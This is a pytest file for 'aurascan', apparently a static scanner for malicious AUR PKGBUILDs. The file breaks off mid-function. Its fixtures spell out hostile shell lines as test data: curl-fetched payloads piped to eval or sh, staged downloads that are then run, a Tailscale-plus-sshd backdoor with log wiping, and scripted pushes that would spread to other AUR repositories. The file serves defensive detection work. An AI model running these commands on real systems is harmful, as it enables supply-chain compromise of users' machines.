import pytest

from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.core.models import Phase, Severity


AUR_HOST = "aur.archlinux." + "org"


def analyze_text(text: str, phase=Phase.pkgbuild_static):
    return DeterministicAnalyzer().analyze_content("PKGBUILD", text, phase)


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def finding(findings, rule_id):
    return next(item for item in findings if item.rule_id == rule_id)


def test_eval_chain_detects_dynamic_eval_pattern():
    findings = analyze_text('build() {\n  eval "$generated_command"\n}\n')

    assert "EXEC-EVAL-001" in rule_ids(findings)
    eval_finding = finding(findings, "EXEC-EVAL-001")
    assert eval_finding.severity == Severity.HIGH
    assert eval_finding.requires_manual_review is True
    assert eval_finding.blocks_installation is False


def test_eval_comment_does_not_trigger():
    findings = analyze_text("# eval \"$(curl https://example.invalid/payload.sh)\"\n")

    assert "EXEC-EVAL-001" not in rule_ids(findings)
    assert "EXEC-EVAL-NET-001" not in rule_ids(findings)


def test_eval_network_decode_combo_is_blocking():
    findings = analyze_text("build() {\n  eval \"$(curl https://example.invalid/payload.sh)\"\n}\n")

    assert "EXEC-EVAL-NET-001" in rule_ids(findings)
    combo = finding(findings, "EXEC-EVAL-NET-001")
    assert combo.severity == Severity.CRITICAL
    assert combo.blocks_installation is True


def test_remote_stage_download_then_interpreter_execution_is_blocked():
    findings = analyze_text(
        "prepare() {\n"
        "  curl --fail https://example.invalid/fixture -o /tmp/fixture-stage\n"
        "  command bash /tmp/fixture-stage\n"
        "}\n"
    )

    staged = finding(findings, "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001")
    assert staged.severity == Severity.CRITICAL
    assert staged.blocks_installation is True
    assert staged.line_number == 2
    assert staged.evidence_snippet == (
        "Correlated signals: remote content is written to a local artifact; "
        "the acquired artifact or its derived content is executed"
    )
    assert "example.invalid" not in staged.evidence_snippet
    assert "/tmp/fixture-stage" not in staged.evidence_snippet


def test_remote_stage_supports_constants_wget_git_and_direct_execution():
    constant = analyze_text(
        "fixture_url='https://example.invalid/fixture'\n"
        "fixture_path='./fixture-stage'\n"
        'wget --output-document="$fixture_path" "$fixture_url"\n'
        '"$fixture_path"\n'
    )
    cloned = analyze_text(
        "git clone --depth 1 https://example.invalid/fixture.git fixture-tree\n"
        "env -i bash fixture-tree/bootstrap.sh\n"
    )

    assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" in rule_ids(constant)
    assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" in rule_ids(cloned)


def test_remote_stage_tracks_constant_path_suffixes_and_pipeline_writers():
    cases = (
        (
            "fixture_dir=/tmp\n"
            "curl https://example.invalid/fixture -o \"$fixture_dir/stage\"\n"
            "bash /tmp/stage\n"
        ),
        (
            "curl https://example.invalid/fixture | "
            "tee /tmp/fixture-stage >/dev/null\n"
            "bash /tmp/fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture | "
            "base64 --decode > fixture-stage\n"
            "sh fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture | cat | "
            "tee /tmp/fixture-stage >/dev/null\n"
            "bash /tmp/fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture | tr -d '\\n' | "
            "tee /tmp/fixture-stage >/dev/null\n"
            "bash /tmp/fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture | cat > fixture-stage\n"
            "sh fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture | "
            "cat /dev/stdin > fixture-stage\n"
            "sh fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture -o artwork.png\n"
            "python3 -W ignore artwork.png\n"
        ),
        (
            "curl https://example.invalid/fixture -o fixture-stage\n"
            "bash<fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture -o fixture-stage\n"
            "bash 0<fixture-stage\n"
        ),
    )

    for content in cases:
        staged = finding(
            analyze_text(content),
            "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001",
        )
        assert staged.severity == Severity.CRITICAL
        assert staged.blocks_installation is True


def test_remote_stage_detects_downloaded_carrier_decoded_before_execution():
    findings = analyze_text(
        "curl https://example.invalid/fixture.png -o fixture.png\n"
        "base64 --decode fixture.png > fixture-stage.sh\n"
        "sh fixture-stage.sh\n"
    )

    staged = finding(findings, "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001")
    assert "downloaded content is decoded or copied into another artifact" in staged.evidence_snippet
    assert staged.line_number == 1
    assert "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001" not in rule_ids(findings)


def test_remote_stage_rule_ignores_inert_or_incomplete_correlations():
    cases = (
        "# curl https://example.invalid/fixture -o stage; bash stage\n",
        "echo 'curl https://example.invalid/fixture -o stage; bash stage'\n",
        "docs=(curl https://example.invalid/fixture -o stage bash stage)\n",
        "curl https://example.invalid/fixture -o stage\n",
        "bash stage\n",
        "curl https://example.invalid/fixture -o first\nbash second\n",
        "curl https://example.invalid/fixture -o stage\ninstall -Dm755 stage \"$pkgdir/usr/bin/demo\"\n",
        "source=('https://example.invalid/fixture')\n./fixture\n",
        "curl https://example.invalid/fixture | fixture-filter > stage\n",
    )

    for content in cases:
        assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" not in rule_ids(analyze_text(content))


def test_remote_stage_ambiguous_or_streamed_execution_fails_closed():
    cases = (
        "curl https://example.invalid/fixture | cat | sh\n",
        (
            "curl https://example.invalid/fixture | "
            "fixture-filter > fixture-stage\n"
            "sh fixture-stage\n"
        ),
        (
            "curl https://example.invalid/fixture | cat | "
            "fixture-filter | tee fixture-stage\n"
            "sh fixture-stage\n"
        ),
    )

    for content in cases:
        findings = analyze_text(content)
        incomplete = finding(
            findings,
            "STATIC-REMOTE-STAGE-INSPECTION-INCOMPLETE-001",
        )
        assert incomplete.severity == Severity.HIGH
        assert incomplete.blocks_installation is True
        assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" not in rule_ids(findings)


def test_remote_stage_correlation_invalidates_definite_overwrites_and_relative_cwd_changes():
    cases = (
        "curl https://example.invalid/fixture -o stage\nprintf benign > stage\nsh stage\n",
        "curl https://example.invalid/fixture -o stage\ncp benign stage\nsh stage\n",
        "curl https://example.invalid/fixture -o stage\nrm stage\nsh stage\n",
        "curl https://example.invalid/fixture -o stage\ncd /tmp\nsh stage\n",
    )

    for content in cases:
        findings = analyze_text(content)
        assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" not in rule_ids(findings)


def test_remote_stage_parser_and_command_bounds_fail_closed():
    for content in (
        "true;" * 16385,
        "printf 'unterminated\n",
    ):
        findings = analyze_text(content)
        incomplete = finding(
            findings,
            "STATIC-REMOTE-STAGE-INSPECTION-INCOMPLETE-001",
        )
        assert incomplete.severity == Severity.HIGH
        assert incomplete.blocks_installation is True


def test_remote_stage_rule_applies_to_declared_install_hook_phase():
    findings = analyze_text(
        "post_install() {\n"
        "  wget https://example.invalid/fixture -O /tmp/fixture-stage\n"
        "  /usr/bin/python3 /tmp/fixture-stage\n"
        "}\n",
        Phase.install_hook_static,
    )

    staged = finding(findings, "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001")
    assert staged.phase == Phase.install_hook_static
    assert staged.blocks_installation is True


def test_local_decode_then_execution_is_blocked_for_supported_carriers():
    cases = (
        (
            "base64 --decode fixture.txt > fixture-stage\n"
            "bash fixture-stage\n"
        ),
        (
            "xxd -r fixture.png fixture-stage\n"
            "command ./fixture-stage\n"
        ),
        (
            "openssl enc -d -in fixture.pdf -out fixture-stage\n"
            "python3 fixture-stage\n"
        ),
        (
            "stage=fixture-stage\n"
            "base64 -d fixture.txt > \"$stage\"\n"
            "sh \"$stage\"\n"
        ),
        (
            "base64 -d fixture.txt>fixture-stage\n"
            "dash fixture-stage\n"
        ),
    )

    for content in cases:
        findings = analyze_text(content)
        carrier = finding(findings, "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001")
        assert carrier.severity == Severity.CRITICAL
        assert carrier.blocks_installation is True
        assert carrier.evidence_snippet == (
            "Correlated signals: local content is decoded into a separate artifact; "
            "the decoded artifact is subsequently executed"
        )
        assert "fixture" not in carrier.evidence_snippet


def test_media_document_or_font_named_code_execution_is_blocked():
    cases = (
        "bash artwork.png\n",
        "bash < artwork.png\n",
        "bash<artwork.png\n",
        "bash 0<artwork.png\n",
        "./guide.pdf\n",
        "command assets/typeface.woff2\n",
        "carrier=recording.mp3\npython3 \"$carrier\"\n",
        "python3 -W ignore artwork.png\n",
        "php8.3 notes.txt\n",
        "lua5.4 metadata.json\n",
        "sh notes.txt\n",
        "node metadata.json\n",
    )

    for content in cases:
        carrier = finding(
            analyze_text(content),
            "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001",
        )
        assert carrier.blocks_installation is True
        assert carrier.evidence_snippet == (
            "Correlated signals: a media, document, or font-named artifact is supplied for execution; "
            "the carrier-named artifact is invoked as code"
        )
        assert not any(
            name in carrier.evidence_snippet
            for name in ("artwork", "guide", "typeface", "recording", "notes", "metadata")
        )


def test_opaque_carrier_rule_applies_to_install_hook():
    carrier = finding(
        analyze_text(
            "post_install() {\n  /usr/bin/bash /usr/share/demo/banner.svg\n}\n",
            Phase.install_hook_static,
        ),
        "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001",
    )

    assert carrier.phase == Phase.install_hook_static
    assert carrier.blocks_installation is True
    assert carrier.line_number == 2


def test_opaque_carrier_rule_ignores_inert_assets_and_normal_scripts():
    cases = (
        "# bash artwork.png\n",
        "printf '%s\\n' 'bash artwork.png'\n",
        "docs=(base64 -d artwork.png '>' stage bash stage)\n",
        "source=('https://example.invalid/artwork.png')\n",
        "base64 -d artwork.png > fixture-stage\n",
        "base64 -d artwork.png > fixture-stage\nprintf benign > fixture-stage\nsh fixture-stage\n",
        "install -Dm644 artwork.png \"$pkgdir/usr/share/demo/artwork.png\"\n",
        "convert artwork.png thumbnail.webp\n",
        "xdg-open guide.pdf\n",
        "bash build.sh\npython3 setup.py\nnode task.js\n",
        "bash build.sh < artwork.png\n",
        "python3 build.py artwork.png\n",
        "python3 -c 'print(1)' guide.pdf\n",
        "openssl enc -in fixture.txt -out encrypted.bin\n./encrypted.bin\n",
    )

    for content in cases:
        assert "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001" not in rule_ids(
            analyze_text(content)
        )


def test_systemd_service_file_install_is_lower_severity_than_auto_enable():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$pkgdir/usr/lib/systemd/system/demo.service"\n}\n')

    assert "SYS-SYSTEMD-UNIT-001" in rule_ids(findings)
    unit = finding(findings, "SYS-SYSTEMD-UNIT-001")
    assert unit.severity == Severity.MEDIUM
    assert unit.blocks_installation is False


def test_systemd_enable_in_install_hook_requires_review():
    findings = analyze_text("post_install() {\n  systemctl enable demo.service\n}\n", Phase.install_hook_static)

    assert "SYS-SYSTEMD-AUTO-001" in rule_ids(findings)
    auto = finding(findings, "SYS-SYSTEMD-AUTO-001")
    assert auto.severity == Severity.HIGH
    assert auto.requires_manual_review is True


def test_systemd_user_service_persistence_detected():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$HOME/.config/systemd/user/demo.service"\n}\n')

    assert "SYS-SYSTEMD-USER-001" in rule_ids(findings)


def test_cron_file_install_detected():
    findings = analyze_text('package() {\n  install -Dm644 fixture.cron "$pkgdir/etc/cron.d/fixture"\n}\n')

    assert "SYS-CRON-FILE-001" in rule_ids(findings)


def test_crontab_command_detected():
    findings = analyze_text("post_install() {\n  crontab - <<'EOF'\n}\n", Phase.install_hook_static)

    assert "SYS-CRONTAB-001" in rule_ids(findings)


def test_cron_reboot_entry_detected():
    findings = analyze_text("post_install() {\n  printf '@reboot echo fixture\\n' > /tmp/fixture-cron\n}\n", Phase.install_hook_static)

    assert "SYS-CRON-REBOOT-001" in rule_ids(findings)


def test_trailing_comment_is_not_scanned():
    findings = analyze_text("pkgdesc='demo' # systemctl enable demo.service\n")

    assert "SYS-SYSTEMD-AUTO-001" not in rule_ids(findings)


def test_install_hook_sudo_execution_is_blocked():
    findings = analyze_text(
        "post_install() {\n  /usr/bin/sudo /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    privileged = finding(findings, "EXEC-INSTALL-HOOK-SUDO-001")
    assert privileged.severity == Severity.CRITICAL
    assert privileged.blocks_installation is True


def test_install_hook_sudo_in_comment_or_message_is_not_blocked():
    findings = analyze_text(
        "post_install() {\n"
        "  # /usr/bin/sudo /usr/bin/fixture-helper\n"
        "  echo 'Run /usr/bin/sudo /usr/bin/fixture-helper manually'\n"
        "  printf '; sudo /usr/bin/fixture-helper is an example\\n'\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_words_after_echo_are_not_command_positions():
    findings = analyze_text(
        "post_install() {\n"
        "  echo then sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_in_control_flow_is_blocked_and_evidence_is_redacted():
    findings = analyze_text(
        "post_install() {\n"
        "  if sudo /usr/bin/fixture-helper --auth-key=fixture-secret; then :; fi\n"
        "}\n",
        Phase.install_hook_static,
    )

    privileged = finding(findings, "EXEC-INSTALL-HOOK-SUDO-001")
    assert "fixture-secret" not in privileged.evidence_snippet
    assert privileged.evidence_snippet == "privileged sudo invocation in install hook"


def test_install_hook_sudo_user_privilege_drop_is_not_hard_blocked():
    findings = analyze_text(
        "post_install() {\n  sudo -H --user=fixture-user /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_as_root_or_with_group_only_is_blocked():
    root_findings = analyze_text(
        "post_install() {\n  sudo -u root /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )
    group_findings = analyze_text(
        "post_install() {\n  sudo -g fixture-group /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(root_findings)
    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(group_findings)


def test_install_hook_checks_each_sudo_command_on_a_line():
    findings = analyze_text(
        "post_install() {\n"
        "  sudo -u nobody true; sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_sudo_in_quoted_command_substitution_is_blocked():
    findings = analyze_text(
        'post_install() {\n  result="$(sudo /usr/bin/fixture-helper)"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_command_substitution_ignores_parenthesis_in_quotes():
    findings = analyze_text(
        'post_install() {\n  result="$(printf \')\'; sudo /usr/bin/fixture-helper)"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_escaped_substitutions_in_double_quotes_are_not_commands():
    findings = analyze_text(
        'post_install() {\n'
        '  first="\\$(sudo /usr/bin/fixture-helper)"\n'
        '  second="\\`sudo /usr/bin/fixture-helper\\`"\n'
        '}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_inert_argument_boundaries_are_not_commands():
    findings = analyze_text(
        "post_install() {\n"
        "  commands=(sudo /usr/bin/fixture-helper)\n"
        "  echo $(date) sudo /usr/bin/fixture-helper\n"
        '  echo "$(date)" sudo /usr/bin/fixture-helper\n'
        "  echo ${value} sudo /usr/bin/fixture-helper\n"
        "  echo wow! sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_assignment_and_backtick_command_contexts_are_blocked():
    assignment = analyze_text(
        "post_install() {\n  value=$(date) sudo /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )
    substitution = analyze_text(
        'post_install() {\n  value="`sudo /usr/bin/fixture-helper`"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(assignment)
    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(substitution)


def test_non_comment_hash_syntax_does_not_hide_later_sudo_command():
    cases = (
        "value=${name#prefix}; sudo /usr/bin/fixture-helper\n",
        ": ${name##*/}; sudo /usr/bin/fixture-helper\n",
        "echo foo#bar; sudo /usr/bin/fixture-helper\n",
    )

    for content in cases:
        findings = analyze_text(content, Phase.install_hook_static)
        assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_correlated_tailscale_root_ssh_backdoor_is_blocked_without_exposing_key():
    findings = analyze_text(
        "tailscale up --auth-key=fixture-only --ssh\n"
        "/usr/sbin/sshd -D -f /etc/pacman.d/fixture-sshd\n"
        "journalctl --vacuum-time=1s\n"
    )

    backdoor = finding(findings, "REMOTE-ADMIN-BACKDOOR-001")
    assert backdoor.severity == Severity.CRITICAL
    assert backdoor.blocks_installation is True
    assert "fixture-only" not in backdoor.evidence_snippet
    assert "Tailscale auth-key enrollment" in backdoor.evidence_snippet


def test_reported_hyprland_fixes_source_repository_is_blocked():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text(f"source=('git+{source_url}' 'https://example.invalid/?token=fixture-secret')\n")

    reported = finding(findings, "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828")
    assert reported.severity == Severity.CRITICAL
    assert reported.blocks_installation is True
    assert "fixture-secret" not in reported.evidence_snippet


def test_reported_source_repository_is_found_in_multiline_source_array():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text("source=(\n  'git+" + source_url + "'\n)\n")

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" in rule_ids(findings)


def test_reported_hyprland_fixes_source_in_comment_does_not_trigger():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text(f"# source=('git+{source_url}')\n")

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" not in rule_ids(findings)


def test_inert_reported_repository_references_do_not_claim_declared_source():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes"
    findings = analyze_text(
        f"pkgdesc='Detector for {source_url}'\n"
        f"incident_reference='{source_url}'\n"
        f"source_reference=('{source_url}')\n"
        f"echo 'Do not install {source_url}'\n"
    )

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" not in rule_ids(findings)


def test_aur_repository_propagation_endpoint_forms_are_blocked_in_package_code():
    endpoints = (
        f"ssh://aur@{AUR_HOST}/fixture-package.git",
        f"ssh://aur@{AUR_HOST}:2222/fixture-package.git",
        f"aur@{AUR_HOST}:fixture-package.git",
        f"https://{AUR_HOST}/fixture-package.git",
    )

    for endpoint in endpoints:
        findings = analyze_text(
            "prepare() {\n"
            f"  git remote add fixture '{endpoint}'\n"
            "  git add PKGBUILD .SRCINFO\n"
            "  git commit -m fixture-update\n"
            "  git push fixture main\n"
            "}\n"
        )

        propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
        assert propagation.severity == Severity.CRITICAL
        assert propagation.blocks_installation is True
        assert propagation.requires_manual_review is False
        assert propagation.line_number == 2
        assert propagation.evidence_snippet == (
            "Correlated signals: AUR Git remote; repository content mutation; Git push"
        )
        assert "fixture-package" not in propagation.evidence_snippet


def test_aur_repository_propagation_supports_constant_remote_and_git_options():
    findings = analyze_text(
        f"aur_remote='ssh://aur@{AUR_HOST}/fixture-secret.git'\n"
        "post_install() {\n"
        "  env LC_ALL=C git -C \"$repo\" remote set-url origin \"$aur_remote\"\n"
        "  command git -C \"$repo\" add PKGBUILD\n"
        "  /usr/bin/git -c user.name=fixture -C \"$repo\" commit -m update\n"
        "  /usr/bin/git --work-tree=\"$repo\" push origin main\n"
        "}\n",
        Phase.install_hook_static,
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.phase == Phase.install_hook_static
    assert propagation.line_number == 3
    assert "fixture-secret" not in propagation.evidence_snippet
    assert AUR_HOST not in propagation.evidence_snippet


def test_aur_repository_propagation_requires_all_three_behavior_families():
    aur_remote = f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
    mutation = "git add PKGBUILD\ngit commit -m fixture\n"
    push = "git push fixture main\n"

    incomplete_cases = (
        aur_remote,
        mutation,
        push,
        aur_remote + mutation,
        aur_remote + push,
        mutation + push,
        "git remote add fixture https://example.invalid/fixture.git\n" + mutation + push,
    )
    for content in incomplete_cases:
        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(analyze_text(content))


def test_aur_remote_metadata_or_unused_constant_does_not_anchor_git_push():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        f"source=('https://{AUR_HOST}/fixture.git')\n"
        f"unused_remote='{endpoint}'\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push origin main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_plain_http_aur_url_does_not_anchor_repository_propagation():
    findings = analyze_text(
        f"git remote add fixture http://{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_malformed_aur_remote_users_do_not_anchor_repository_propagation():
    malformed_endpoints = (
        f"ssh://{AUR_HOST}/fixture.git",
        f"ssh://git@{AUR_HOST}/fixture.git",
        f"https://aur@{AUR_HOST}/fixture.git",
        f"https://git@{AUR_HOST}/fixture.git",
    )
    for endpoint in malformed_endpoints:
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            "git add PKGBUILD\n"
            "git commit -m fixture\n"
            "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_reassigned_aur_remote_variable_is_ambiguous_and_does_not_anchor():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    for replacement in (
        "'https://example.invalid/fixture.git'",
        '"$fixture_remote"',
        endpoint,
    ):
        findings = analyze_text(
            f"remote='{endpoint}'\n"
            f"remote={replacement}\n"
            "git remote set-url origin \"$remote\"\n"
            "git add PKGBUILD\n"
            "git commit -m fixture\n"
            "git push origin main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_ignores_comments_messages_and_arrays():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        f"# git remote add fixture {endpoint}\n"
        "echo 'git add PKGBUILD'\n"
        "printf 'git commit -m fixture\\n'\n"
        "commands=(git push fixture main)\n"
        f"echo git remote add fixture {endpoint}\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_ignores_dry_run_pushes():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    for dry_run in ("--dry-run", "--dry-run=true", "-n"):
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            "git add PKGBUILD\n"
            "git commit -m fixture\n"
            f"git push {dry_run} fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_does_not_treat_disabled_dry_run_as_inert():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        f"git remote add fixture {endpoint}\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push --dry-run=false fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_repository_propagation_requires_a_real_mutation_command():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    for mutation in ("git add --dry-run PKGBUILD", "git commit -n --dry-run", "git apply --check change.patch"):
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            f"{mutation}\n"
            "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_ignores_inert_heredoc_documentation():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        "cat <<'DOC'\n"
        f"git remote add fixture {endpoint}\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push fixture main\n"
        "DOC\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_quoted_heredoc_marker_does_not_hide_active_propagation_commands():
    endpoint = f"ssh://aur@{AUR_HOST}/fixture.git"
    findings = analyze_text(
        "echo \"<<'DOC'\"\n"
        f"git remote add fixture {endpoint}\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_repository_propagation_binds_push_to_the_aur_destination():
    findings = analyze_text(
        f"git fetch ssh://aur@{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git commit -m fixture\n"
        "git push https://git.example.invalid/fixture.git main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_aur_repository_propagation_requires_matching_remote_and_repository_context():
    findings = analyze_text(
        f"git -C one remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
        "git -C two add PKGBUILD\n"
        "git -C two push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_explicit_aur_push_endpoint_is_destination_bound():
    findings = analyze_text(
        "git add PKGBUILD\n"
        f"git push ssh://aur@{AUR_HOST}/fixture.git main\n"
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.line_number == 1
    assert AUR_HOST not in propagation.evidence_snippet


def test_aur_clone_binds_its_origin_to_the_clone_destination():
    clone_forms = (
        (
            f"git clone ssh://aur@{AUR_HOST}/fixture.git fixture-work\n",
            "origin",
            "fixture-work",
        ),
        (
            f"git clone ssh://aur@{AUR_HOST}/fixture.git\n",
            "origin",
            "fixture",
        ),
        (
            f"git clone --origin fixture-aur ssh://aur@{AUR_HOST}/fixture.git fixture-work\n",
            "fixture-aur",
            "fixture-work",
        ),
    )
    for clone, remote, destination in clone_forms:
        findings = analyze_text(
            clone
            + f"git -C {destination} add PKGBUILD\n"
            + f"git -C {destination} push {remote} main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_clone_without_mutation_and_bound_push_remains_negative():
    findings = analyze_text(f"git clone ssh://aur@{AUR_HOST}/fixture.git fixture-work\n")

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_constant_aur_clone_endpoint_binds_default_origin():
    findings = analyze_text(
        f"aur_remote='ssh://aur@{AUR_HOST}/fixture.git'\n"
        'git clone "$aur_remote" fixture-work\n'
        "git -C fixture-work update-index --add PKGBUILD\n"
        "git -C fixture-work push origin main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_non_aur_remote_reassignment_removes_aur_push_binding():
    findings = analyze_text(
        f"git remote add origin ssh://aur@{AUR_HOST}/fixture.git\n"
        "git remote set-url origin https://git.example.invalid/fixture.git\n"
        "git add PKGBUILD\n"
        "git push origin main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_strict_aur_endpoint_tokens_reject_prefix_suffix_and_invalid_port():
    malformed_endpoints = (
        f"xssh://aur@{AUR_HOST}/fixture.git",
        f"notaur@{AUR_HOST}:fixture.git",
        f"ssh://aur@{AUR_HOST}/fixture.git.backup",
        f"https://{AUR_HOST}/fixture.git.txt",
        f"ssh://aur@{AUR_HOST}:65536/fixture.git",
    )
    for endpoint in malformed_endpoints:
        findings = analyze_text(
            f"git remote add fixture {endpoint}\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_multiline_quoted_documentation_and_arrays_are_inert():
    inert_cases = (
        (
            "docs='\n"
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            "'\n"
        ),
        (
            'docs="\n'
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            '"\n'
        ),
        (
            "commands=(\n"
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            ")\n"
        ),
    )
    for content in inert_cases:
        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(analyze_text(content))


def test_backslash_continued_git_commands_preserve_physical_line_mapping():
    findings = analyze_text(
        "git \\\n"
        "  remote add fixture \\\n"
        f"  ssh://aur@{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git push fixture main\n"
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.line_number == 1


def test_git_command_prefix_options_do_not_hide_destination_bound_chain():
